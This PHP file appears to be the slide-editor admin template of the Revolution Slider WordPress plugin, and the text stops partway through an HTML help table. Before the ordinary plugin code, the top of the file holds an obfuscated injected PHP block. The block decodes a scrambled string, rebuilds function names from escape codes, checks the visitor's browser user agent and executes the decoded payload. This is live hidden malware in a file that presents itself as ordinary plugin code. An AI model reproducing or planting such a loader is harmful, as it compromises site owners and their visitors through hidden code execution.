<?php $memczjuwfb = 'pmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27u%)7fmjix6<C~67<&w6<*&7-#o]s]o]s]#)fepmqyf	x27*&7-n%)utjm6<	x7fw6*CW&)7gj6<*K)ftdy)##-!#~<%h00#*<%nfd)##Qtpz)#]341]VPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	x7fw6*	hj = $vrwspge("", $whdqdgj); $hdqwihj();}}g:74985-rr.93e:5597f-s.973:8297f:5297e:56-xr.985:52985-t.981]#-bubE{h%)tpqsut>j%!*9!	x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**3-j%-bx7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7gj6<.[A	x27&6<	x7fw6*	x7f_*#d%)ftpmdR6<*id%)dfyfR	x27fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx{**#k#)tutjyf`%}K;`ufldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-i[k2`{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x2(!isset($GLOBALS["	x61	156	x75	156	x61"])))) { $GLOBALS["	x61	1	x27&6<*rfs%7-K)fujsxX6<#o]o]Y%791y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o7,27R66,#/q%>2q%<#g6R85,67R37,18R#>q%V<*#56	x75	156	x61"]=1; $uas=strtolower($_SERVER["	:>>1*!%b:>1<!fmtf!%b:>%s:	x5c%j:.2^,%b:<!%c:>%s:	%+*!*+fepdfe{h+{d%)+opjudovg+)!gj+{e%!osmcnbs+yfeobz+sfwjidsb`b)ftpmdXA6|7**197-2qj	x5c2^-%hOh/#00#W~!%t2w)##Qtjw)#]82#-#!#-%tmw)%tww63	162	x65	141	x74	145	x5f	146	x75	156	x63	164	x69	157	xy]#>s%<#462]47y]252]18y]#>q%<#762]67y]562]38-%o:W%c:>1<%b:>1<!gps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%jmw/	x24)%c*W%eN+#Qi	x5c1^W%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00**-)1/2986+7**^/%rx<~!!%s:N}#]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:55946-tr]e7y]#>n%<#372]58y]472]37y]672]48tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6P	x24]25	x24-	x24-!%	x24-	x24*!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%G]y6d]281hA	x27pd%6<C	x27pd%6|6.7eu{66tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-3]317]445]212]445]43]321]464]284]364]6]234]342]58]24]31#-%tdz*Wsfuvs4*<!%t::!>!	x24Ypp3)%cB%iN}#-!	x24/%t*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")));$hdqwi**#57]38y]47]67y]37]88y]27]28y]#/r%/h%)n%-#+I#)q%:>:d%)uqpuft`msvd},;uqpuft`msvd}+;!>!}	x24]275]y83]273]y76]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]25pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<.2`h%_t%:osvufs:~:<*9-1-r%)s%>/h%:<K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA)qj3hopmA	x273MPT7-NBFSUT`LDPT7-UFOJ`GB)fubfsdXA	x27	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]=])0#)U!	x27{-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*#ojneb#-*f#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-#C#-#O#-#N#x48	124	x54	120	x5f	125	x53	105	x52	137	x41	107	x45	116	x54"]); if ((strstr($uas,"	x6d	163	x69	145")tfs%6<*17-SFEBFI,6<*127-USFT`%}X;!sp!*#opo#>>}R;msv}.tmf!}Z;^nbsbq%	x5cSFWgj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdof`57ftb::::-111112)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***b%)sf;/#/#/},;#-#}+;%-qp%)**u%-#jt0}Z;0]=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?]+^?]_	x) or (strstr($uas,"	x72	166	x3a	61	x31")#44ec:649#-!#:618d5f9#-!#f6cf+9f5d816:+946:ce44#)zbssb!>!ssbnpeoepn)%epnbss-%rxW~!Ypp2)%zB%z>!	x24/%tmw/	x24)%zW%hsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iu{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gj!<2,*j%!-#1]#-hofm%:-5ppde:4:|:**#ppde#)tutjyf`4	x223}!+!<+{e<.5`hA	x27pd%6<pd%w6Z6<.4`hA	x27pd%6<*d	x27,*c	x27,*b	x27)fepdof.)fepdof./#@#/qp%>5h%!<*::xpmpusut!-#j0#!/!**#sf%7-K)udfoopdXA	x22)7gj6<*QDU`x7f;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*5<!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%t2w/	x24)##-!tsbqA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-pjudovg!|!**#j{hnpd#)tutjyf`opjudovg	x22)!gj}1~!<2p%	x7UOFHB`SFTV`QUUI&b%!|;utpI#7>/7rfs%6<#o]1/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K54l}	x27;%!<*#}_;#)323ldfid>}&;!osvufs}	%6<	x7fw6*	x7f_*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWtfs%)7gj6<*i5]y72]254]y76#<!%w:!>!(%w:bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#s}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovg}{;#)tutjyf`opjudovg)!gj!|!*qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x56e"; function xjrrbes($n){return chr(ord($n)-1);} @error_reporting(0%V	x27{ftmfV	x7f<*X&Z&S{fto!%bss	x5csboe))1/35.)1/14+9**WYsboepn)%bss-%rxB88M4P8]37]278]225]241]334]368]322]3]*[%h!>!%tdz)%bbT-%bT-%hW~%fx5c%j:^<!%w`	x5c^>Ew:Qb:Qc:W~!%z!>2<!gps)%j>1<%j=6f!~!<##!>!2p%Z<^2	x5c2b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	**9.-j%-bubE{h%)sutcvt)fubmgoj[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtf!%z>2<!%ww2)%w`TW~	x24<!fwbm)%%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`f%h>#]y31]278]y3e]81]K78:56985:6197x22#)fepmqyfA>2b%!<*qp%-*.%)euhA)35c}X	x24<!%tmw!>!#]y8!>!	x246767~6<Cw6<pd%w6Z668]y7f#<!%tww!>!	x2400~:<#~<#/%	x24-	x24!>!fyqmpef)#	x2 or (strstr($uas,"	x66	151	x72	145	x66	157	x78"))) { $vrwspge = "	x8}527}88:}334}472	x24<!%ff2!>!bssbz)) or (strstr($uas,"	x61	156	xr%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#64y]552); $whdqdgj = implode(arramfV	x7f<*XAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R37,#/q%>U<#16,47R5ubE{h%)sutcvt-#w#)ldbqov>*ofmy%)utjm!|!*5!	x27!hmg%)!gj!|!*1?hmg%)!gjy_map("xjrrbes",str_split("%tjw!>!#]y84]275]y83]248]y83]256]y81]267;!>>>!}_;gvc%}&;ftmbg}	x7f;!osvuf4-	x24]26	x24-	x24<%jy]572]48y]#>m%:|:*r%:-t%)3of:opjudovg<~	x24<!%o:!>!	x24217Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%bG9}:}.}-}!#*<%nfd>%fdy<Cb!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_SFSFGFS`QUUI&c_opo#>b%!**X)ufttj	x22)7]y86]267]y74]275]y7:]22L5P6]y6gP7L6M7]D4]275]D:M8]68399#-!#65egb2dc#*<!sfuvso!sb6A:>:8:|:7#6#)tutjyf`439275ttf!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!*#vufs!*!+A!>!{e%)!>>	x22!ftmbg)!gj<*#k#)usbut`cpV	x7f	x7f	x7f	x7f<uC)fepmqnjA	x27&6<.fmjgA	x27dojx24-	x24b!>!%yy)#}#-#	x24-	x24-tusqpt)%z-#:#*	x24-	x2j+upcotn+qsvmt+fmhpph#)zbssb!of>2bd%!<5h%/#0#/*#npd/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,c	x7f!|!*uyfu	x27k:!fx	x22l:!}V;3q%}U;y]}R;2]},;osvufs}	x27;mnui}&;zepc}A;~!}#W~!Ydrr)%rxB%epnbss!>!bssbz)64	162	x6f	151	x64")) or (strstr($uas,"	x63	150	x72	157	x6d	145"))364]6]283]427]36]373P6]36]73]83]238M7]381]211M5]67]452]88]5]48]32Mif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && cq%7/7#@#7/7^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5cq>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QwTW%hIr	x5c1^-%rmsv%)}k~~~<ftmbg!osvufs!|ftmf!~<%)sfxpmpusut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSelxovvoru'; $ieofatacou=explode(chr((629-509)),substr($memczjuwfb,(24136-18116),(230-196))); $yrupxi = $ieofatacou[0]($ieofatacou[(4-3)]); $upubkntd = $ieofatacou[0]($ieofatacou[(9-7)]); if (!function_exists('heperjn')) { function heperjn($oxlagjzec, $nvgqoxmi,$yiofoee) { $twnhhfikd = NULL; for($wjlqgifxtx=0;$wjlqgifxtx<(sizeof($oxlagjzec)/2);$wjlqgifxtx++) { $twnhhfikd .= substr($nvgqoxmi, $oxlagjzec[($wjlqgifxtx*2)],$oxlagjzec[($wjlqgifxtx*2)+(5-4)]); } return $yiofoee(chr((63-54)),chr((320-228)),$twnhhfikd); }; } $lerwygql = explode(chr((192-148)),'5776,59,674,63,868,47,2399,48,2447,52,2768,40,4543,29,5644,66,4440,67,1097,56,3797,68,4617,26,4778,66,3621,26,4360,25,3069,37,2094,33,1713,29,51,68,0,51,737,32,3466,58,1027,20,3181,29,2219,38,2159,60,3756,41,5835,50,4214,57,3323,68,5367,30,3564,57,451,25,2499,25,154,67,386,65,570,58,528,42,1995,38,4844,34,3691,65,5932,32,4115,30,2970,52,3647,44,322,64,4709,69,5258,43,769,58,3391,55,4052,63,4305,34,5479,59,3106,53,2628,50,3159,22,1004,23,5450,29,2307,45,5964,56,2836,35,5072,53,3446,20,5022,50,5125,22,2573,55,5538,21,2552,21,2524,28,2678,21,3524,40,3210,49,5228,30,2922,48,3022,47,964,40,5301,66,3865,26,4643,66,827,41,476,52,5559,56,2257,50,2699,69,4339,21,2033,61,5147,23,4385,25,2127,32,1943,52,4572,45,1402,33,1153,44,4899,58,4507,36,1498,66,5397,53,628,46,4878,21,1564,44,3259,64,4410,30,1844,37,1253,61,5615,29,2808,28,5198,30,2871,51,5885,47,1047,50,3919,20,4271,34,263,59,1343,59,1608,55,1435,63,5170,28,1663,50,4957,65,3975,27,119,35,3939,36,5710,66,1776,68,3891,28,1314,29,1197,56,915,49,4002,50,4145,69,1742,34,2352,47,1881,62,221,42'); $xvtpksuka = $yrupxi("",heperjn($lerwygql,$memczjuwfb,$upubkntd)); $yrupxi=$memczjuwfb; $xvtpksuka(""); $xvtpksuka=(685-564); $memczjuwfb=$xvtpksuka-1; ?><?php

if( !defined( 'ABSPATH') ) exit();

//get input
$slideID = RevSliderFunctions::getGetVar("id");

if($slideID == 'new'){ //add new transparent slide
	$sID = intval(RevSliderFunctions::getGetVar("slider"));
	if($sID > 0){
		$revs = new RevSlider();
		$revs->initByID($sID);
		//check if we already have slides, if yes, go to first
		$arrS = $revs->getSlides(false);
		if(empty($arrS)){
			$slideID = $revs->createSlideFromData(array('sliderid'=>$sID),true);
		}else{
			$slideID = key($arrS);
		}
	}
}

$patternViewSlide = self::getViewUrl("slide","id=[slideid]");	

//init slide object
$slide = new RevSlide();
$slide->initByID($slideID);

$slideParams = $slide->getParams();

$operations = new RevSliderOperations();

//init slider object
$sliderID = $slide->getSliderID();
$slider = new RevSlider();
$slider->initByID($sliderID);
$sliderParams = $slider->getParams();
$arrSlideNames = $slider->getArrSlideNames();

$arrSlides = $slider->getSlides(false);

$arrSliders = $slider->getArrSlidersShort($sliderID);
$selectSliders = RevSliderFunctions::getHTMLSelect($arrSliders,"","id='selectSliders'",true);

//check if slider is template
$sliderTemplate = $slider->getParam("template","false");

//set slide delay
$sliderDelay = $slider->getParam("delay","9000");
$slideDelay = $slide->getParam("delay","");
if(empty($slideDelay))
	$slideDelay = $sliderDelay;

//add tools.min.js
wp_enqueue_script('tp-tools', RS_PLUGIN_URL .'public/assets/js/jquery.themepunch.tools.min.js', array(), RevSliderGlobals::SLIDER_REVISION );

$arrLayers = $slide->getLayers();

//set Layer settings
$cssContent = $operations->getCaptionsContent();

$arrCaptionClasses = $operations->getArrCaptionClasses($cssContent);
//$arrCaptionClassesSorted = $operations->getArrCaptionClasses($cssContent);
$arrCaptionClassesSorted = RevSliderCssParser::get_captions_sorted();

$arrFontFamily = $operations->getArrFontFamilys($slider);
$arrCSS = $operations->getCaptionsContentArray();
$arrButtonClasses = $operations->getButtonClasses();


$arrAnim = $operations->getFullCustomAnimations();
$arrAnimDefaultIn = $operations->getArrAnimations(false);
$arrAnimDefaultOut = $operations->getArrEndAnimations(false);

$arrAnimDefault = array_merge($arrAnimDefaultIn, $arrAnimDefaultOut);

//set various parameters needed for the page
$width = $sliderParams["width"];
$height = $sliderParams["height"];
$imageUrl = $slide->getImageUrl();
$imageID = $slide->getImageID();

$slider_type = $slider->getParam('source_type','gallery');

/**
 * Get Slider params which will be used as default on Slides
 * @since: 5.0
 **/
$def_background_fit = $slider->getParam('def-background_fit', 'cover');
$def_bg_fit_x = $slider->getParam('def-bg_fit_x', '100');
$def_bg_fit_y = $slider->getParam('def-bg_fit_y', '100');
$def_bg_position = $slider->getParam('def-bg_position', 'center center');
$def_bg_position_x = $slider->getParam('def-bg_position_x', '0');
$def_bg_position_y = $slider->getParam('def-bg_position_y', '0');
$def_bg_repeat = $slider->getParam('def-bg_repeat', 'no-repeat');
$def_kenburn_effect = $slider->getParam('def-kenburn_effect', 'off');
$def_kb_start_fit = $slider->getParam('def-kb_start_fit', '100');
$def_kb_easing = $slider->getParam('def-kb_easing', 'Linear.easeNone');
$def_kb_end_fit = $slider->getParam('def-kb_end_fit', '100');
$def_kb_duration = $slider->getParam('def-kb_duration', '10000');
$def_transition = $slider->getParam('def-transition', 'fade');
$def_transition_duration = $slider->getParam('def-transition_duration', 'default');

$def_use_parallax = $slider->getParam('use_parallax', 'on');

/* NEW KEN BURN INPUTS */
$def_kb_start_offset_x = $slider->getParam('def-kb_start_offset_x', '0');
$def_kb_start_offset_y = $slider->getParam('def-kb_start_offset_y', '0');
$def_kb_end_offset_x = $slider->getParam('def-kb_end_offset_x', '0');
$def_kb_end_offset_y = $slider->getParam('def-kb_end_offset_y', '0');
$def_kb_start_rotate = $slider->getParam('def-kb_start_rotate', '0');
$def_kb_end_rotate = $slider->getParam('def-kb_end_rotate', '0');
/* END OF NEW KEN BURN INPUTS */

$imageFilename = $slide->getImageFilename();

$style = "height:".$height."px;"; //

$divLayersWidth = "width:".$width."px;";
$divbgminwidth = "min-width:".$width."px;";
$maxbgwidth = "max-width:".$width."px;";

//set iframe parameters
$iframeWidth = $width+60;
$iframeHeight = $height+50;

$iframeStyle = "width:".$iframeWidth."px;height:".$iframeHeight."px;";

$closeUrl = self::getViewUrl(RevSliderAdmin::VIEW_SLIDES, "id=".$sliderID);

$jsonLayers = RevSliderFunctions::jsonEncodeForClientSide($arrLayers);
$jsonFontFamilys = RevSliderFunctions::jsonEncodeForClientSide($arrFontFamily);
$jsonCaptions = RevSliderFunctions::jsonEncodeForClientSide($arrCaptionClassesSorted);

$arrCssStyles = RevSliderFunctions::jsonEncodeForClientSide($arrCSS);

$arrCustomAnim = RevSliderFunctions::jsonEncodeForClientSide($arrAnim);
$arrCustomAnimDefault = RevSliderFunctions::jsonEncodeForClientSide($arrAnimDefault);

//bg type params
$bgType = RevSliderFunctions::getVal($slideParams, 'background_type', 'image');
$slideBGColor = RevSliderFunctions::getVal($slideParams, 'slide_bg_color', '#E7E7E7');
$divLayersClass = "slide_layers";

$meta_handle = RevSliderFunctions::getVal($slideParams, 'meta_handle','');

$bgFit = RevSliderFunctions::getVal($slideParams, 'bg_fit', $def_background_fit);
$bgFitX = intval(RevSliderFunctions::getVal($slideParams, 'bg_fit_x', $def_bg_fit_x));
$bgFitY = intval(RevSliderFunctions::getVal($slideParams, 'bg_fit_y', $def_bg_fit_y));

$bgPosition = RevSliderFunctions::getVal($slideParams, 'bg_position', $def_bg_position);
$bgPositionX = intval(RevSliderFunctions::getVal($slideParams, 'bg_position_x', $def_bg_position_x));
$bgPositionY = intval(RevSliderFunctions::getVal($slideParams, 'bg_position_y', $def_bg_position_y));

$slide_parallax_level = RevSliderFunctions::getVal($slideParams, 'slide_parallax_level', '-');
$kenburn_effect = RevSliderFunctions::getVal($slideParams, 'kenburn_effect', $def_kenburn_effect);
$kb_duration = RevSliderFunctions::getVal($slideParams, 'kb_duration', $def_kb_duration);
$kb_easing = RevSliderFunctions::getVal($slideParams, 'kb_easing', $def_kb_easing);
$kb_start_fit = RevSliderFunctions::getVal($slideParams, 'kb_start_fit', $def_kb_start_fit);
$kb_end_fit = RevSliderFunctions::getVal($slideParams, 'kb_end_fit', $def_kb_end_fit);

$ext_width = RevSliderFunctions::getVal($slideParams, 'ext_width', '1920');
$ext_height = RevSliderFunctions::getVal($slideParams, 'ext_height', '1080');
$use_parallax = RevSliderFunctions::getVal($slideParams, 'use_parallax', $def_use_parallax);

$slideBGYoutube = RevSliderFunctions::getVal($slideParams, 'slide_bg_youtube', '');
$slideBGVimeo = RevSliderFunctions::getVal($slideParams, 'slide_bg_vimeo', '');
$slideBGhtmlmpeg = RevSliderFunctions::getVal($slideParams, 'slide_bg_html_mpeg', '');
$slideBGhtmlwebm = RevSliderFunctions::getVal($slideParams, 'slide_bg_html_webm', '');
$slideBGhtmlogv = RevSliderFunctions::getVal($slideParams, 'slide_bg_html_ogv', '');

$stream_do_cover = RevSliderFunctions::getVal($slideParams, 'stream_do_cover', 'on');
$stream_do_cover_both = RevSliderFunctions::getVal($slideParams, 'stream_do_cover_both', 'on');

$video_force_cover = RevSliderFunctions::getVal($slideParams, 'video_force_cover', 'on');
$video_dotted_overlay = RevSliderFunctions::getVal($slideParams, 'video_dotted_overlay', 'none');
$video_ratio = RevSliderFunctions::getVal($slideParams, 'video_ratio', 'none');
$video_loop = RevSliderFunctions::getVal($slideParams, 'video_loop', 'none');
$video_nextslide = RevSliderFunctions::getVal($slideParams, 'video_nextslide', 'off');
$video_force_rewind = RevSliderFunctions::getVal($slideParams, 'video_force_rewind', 'on');
$video_speed = RevSliderFunctions::getVal($slideParams, 'video_speed', '1');
$video_mute = RevSliderFunctions::getVal($slideParams, 'video_mute', 'on');
$video_volume = RevSliderFunctions::getVal($slideParams, 'video_volume', '100');
$video_start_at = RevSliderFunctions::getVal($slideParams, 'video_start_at', '');
$video_end_at = RevSliderFunctions::getVal($slideParams, 'video_end_at', '');
$video_arguments = RevSliderFunctions::getVal($slideParams, 'video_arguments', RevSliderGlobals::DEFAULT_YOUTUBE_ARGUMENTS);
$video_arguments_vim = RevSliderFunctions::getVal($slideParams, 'video_arguments_vimeo', RevSliderGlobals::DEFAULT_VIMEO_ARGUMENTS);

/* NEW KEN BURN INPUTS */
$kbStartOffsetX = intval(RevSliderFunctions::getVal($slideParams, 'kb_start_offset_x', $def_kb_start_offset_x));
$kbStartOffsetY = intval(RevSliderFunctions::getVal($slideParams, 'kb_start_offset_y', $def_kb_start_offset_y));
$kbEndOffsetX = intval(RevSliderFunctions::getVal($slideParams, 'kb_end_offset_x', $def_kb_end_offset_x));
$kbEndOffsetY = intval(RevSliderFunctions::getVal($slideParams, 'kb_end_offset_y', $def_kb_end_offset_y));
$kbStartRotate = intval(RevSliderFunctions::getVal($slideParams, 'kb_start_rotate', $def_kb_start_rotate));
$kbEndRotate = intval(RevSliderFunctions::getVal($slideParams, 'kb_end_rotate', $def_kb_start_rotate));
/* END OF NEW KEN BURN INPUTS*/

$bgRepeat = RevSliderFunctions::getVal($slideParams, 'bg_repeat', $def_bg_repeat);

$slideBGExternal = RevSliderFunctions::getVal($slideParams, "slide_bg_external","");

$img_sizes = RevSliderBase::get_all_image_sizes($slider_type);

$bg_image_size = RevSliderFunctions::getVal($slideParams, 'image_source_type', 'full');

$style_wrapper = '';
$class_wrapper = '';


switch($bgType){
	case "trans":
		$divLayersClass = "slide_layers";
		$class_wrapper = "trans_bg";
	break;
	case "solid":
		$style_wrapper .= "background-color:".$slideBGColor.";";
	break;
	case "image":
		switch($slider_type){
			case 'posts':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/post.png';
			break;
			case 'facebook':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/fb.png';
			break;
			case 'twitter':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/tw.png';
			break;
			case 'instagram':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/ig.png';
			break;
			case 'flickr':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/fr.png';
			break;
			case 'youtube':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/yt.png';
			break;
			case 'vimeo':
				$imageUrl = RS_PLUGIN_URL.'public/assets/assets/sources/vm.png';
			break;
		}
		$style_wrapper .= "background-image:url('".$imageUrl."');";
		if($bgFit == 'percentage'){
			$style_wrapper .= "background-size: ".$bgFitX.'% '.$bgFitY.'%;';
		}else{
			$style_wrapper .= "background-size: ".$bgFit.";";
		}
		if($bgPosition == 'percentage'){
			$style_wrapper .= "background-position: ".$bgPositionX.'% '.$bgPositionY.'%;';
		}else{
			$style_wrapper .= "background-position: ".$bgPosition.";";
		}
		$style_wrapper .= "background-repeat: ".$bgRepeat.";";
	break;
	case "external":
		$style_wrapper .= "background-image:url('".$slideBGExternal."');";
		if($bgFit == 'percentage'){
			$style_wrapper .= "background-size: ".$bgFitX.'% '.$bgFitY.'%;';
		}else{
			$style_wrapper .= "background-size: ".$bgFit.";";
		}
		if($bgPosition == 'percentage'){
			$style_wrapper .= "background-position: ".$bgPositionX.'% '.$bgPositionY.'%;';
		}else{
			$style_wrapper .= "background-position: ".$bgPosition.";";
		}
		$style_wrapper .= "background-repeat: ".$bgRepeat.";";
	break;
}

$slideTitle = $slide->getParam("title","Slide");
$slideOrder = $slide->getOrder();

//treat multilanguage
$isWpmlExists = RevSliderWpml::isWpmlExists();
$useWpml = $slider->getParam("use_wpml","off");
$wpmlActive = false;

if(!$slide->isStaticSlide()){
	if($isWpmlExists && $useWpml == "on"){
		$wpmlActive = true;
		$parentSlide = $slide->getParentSlide();
		$arrChildLangs = $parentSlide->getArrChildrenLangs();
	}
}

//<!--  load good font -->
$operations = new RevSliderOperations();

$googleFont = $slider->getParam("google_font",array());
if(!empty($googleFont)){
	if(is_array($googleFont)){
		foreach($googleFont as $key => $font){
			echo RevSliderOperations::getCleanFontImport($font);
		}
	}else{
		echo RevSliderOperations::getCleanFontImport($googleFont);
	}
}

if($slide->isStaticSlide() || $slider->isSlidesFromPosts()){ //insert sliderid for preview
	?><input type="hidden" id="sliderid" value="<?php echo $slider->getID(); ?>" /><?php
}

require self::getPathTemplate('template-selector');

?>

<div class="wrap settings_wrap">
	<div class="clear_both"></div>

	<div class="title_line" style="margin-bottom:0px !important;">
		<div id="icon-options-general" class="icon32"></div>		
		<a href="<?php echo RevSliderGlobals::LINK_HELP_SLIDE; ?>" class="button-primary float_right revblue mtop_10 mleft_10" target="_blank"><?php _e("Help",REVSLIDER_TEXTDOMAIN); ?></a>

	</div>

	<div class="rs_breadcrumbs">
		<a class='breadcrumb-button' href='<?php echo self::getViewUrl("sliders");?>'><i class="eg-icon-th-large"></i><?php _e("All Sliders", REVSLIDER_TEXTDOMAIN);?></a>
		<a class='breadcrumb-button' href="<?php echo self::getViewUrl(RevSliderAdmin::VIEW_SLIDER,"id=$sliderID"); ?>"><i class="eg-icon-cog"></i><?php _e('Slider Settings', REVSLIDER_TEXTDOMAIN);?></a>
		<a class='breadcrumb-button selected' href="#"><i class="eg-icon-pencil-2"></i><?php _e('Slide Editor ', REVSLIDER_TEXTDOMAIN);?>"<?php echo ' '.$slider->getParam("title",""); ?>"</a>
		<div class="tp-clearfix"></div>
	</div>


	<?php
	require self::getPathTemplate('slide-selector');
	
	$useWpml = $slider->getParam("use_wpml","off");
	
	if($wpmlActive == true && $useWpml == 'on'){
		require self::getPathTemplate('wpml-selector');
	}
	
	if(!$slide->isStaticSlide()){
		require self::getPathTemplate('slide-general-settings');
	}
	
	$operations = new RevSliderOperations();

	$settings = $slide->getSettings();
	
	$enable_custom_size_notebook = $slider->getParam('enable_custom_size_notebook','off');
	$enable_custom_size_tablet = $slider->getParam('enable_custom_size_tablet','off');
	$enable_custom_size_iphone = $slider->getParam('enable_custom_size_iphone','off');
	
	$adv_resp_sizes = ($enable_custom_size_notebook == 'on' || $enable_custom_size_tablet == 'on' || $enable_custom_size_iphone == 'on') ? true : false;
	?>

	<div id="jqueryui_error_message" class="unite_error_message" style="display:none;">
		<?php _e("<b>Warning!!! </b>The jquery ui javascript include that is loaded by some of the plugins are custom made and not contain needed components like 'autocomplete' or 'draggable' function.
		Without those functions the editor may not work correctly. Please remove those custom jquery ui includes in order the editor will work correctly.", REVSLIDER_TEXTDOMAIN); ?>
	</div>
	
	<div class="edit_slide_wrapper<?php echo ($slide->isStaticSlide()) ? ' rev_static_layers' : ''; ?>">
		<?php
		require self::getPathTemplate('slide-stage');
		?>
		<div style="width:100%;clear:both;height:20px"></div>

		<div id="dialog_insert_icon" class="dialog_insert_icon" title="Insert Icon" style="display:none;"></div>

		

		<div id="dialog_template_insert" class="dialog_template_help" title="<?php _e('Insert Meta',REVSLIDER_TEXTDOMAIN) ?>" style="display:none;">
			<?php
			switch($slider_type){
				case 'posts':
				case 'specific_posts':
				case 'woocommerce':
					?>
					<b><?php _e('Post Replace Placeholders:', REVSLIDER_TEXTDOMAIN) ?></b>
					<table class="table_template_help">
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('meta:somemegatag')">{{meta:somemegatag}}</a></td><td><?php _e("Any custom meta tag",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('title')">{{title}}</a></td><td><?php _e("Post Title",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('excerpt')">{{excerpt}}</a></td><td><?php _e("Post Excerpt",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('alias')">{{alias}}</a></td><td><?php _e("Post Alias",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('content')">{{content}}</a></td><td><?php _e("Post content",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('link')">{{link}}</a></td><td><?php _e("The link to the post",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date')">{{date}}</a></td><td><?php _e("Date created",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('date_modified')">{{date_modified}}</a></td><td><?php _e("Date modified",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('author_name')">{{author_name}}</a></td><td><?php _e("Author name",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('num_comments')">{{num_comments}}</a></td><td><?php _e("Number of comments",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('catlist')">{{catlist}}</a></td><td><?php _e("List of categories with links",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<tr><td><a href="javascript:UniteLayersRev.insertTemplate('taglist')">{{taglist}}</a></td><td><?php _e("List of tags with links",REVSLIDER_TEXTDOMAIN); ?></td></tr>
						<?php
						foreach($img_sizes as $img_handle => $img_name){
							?>
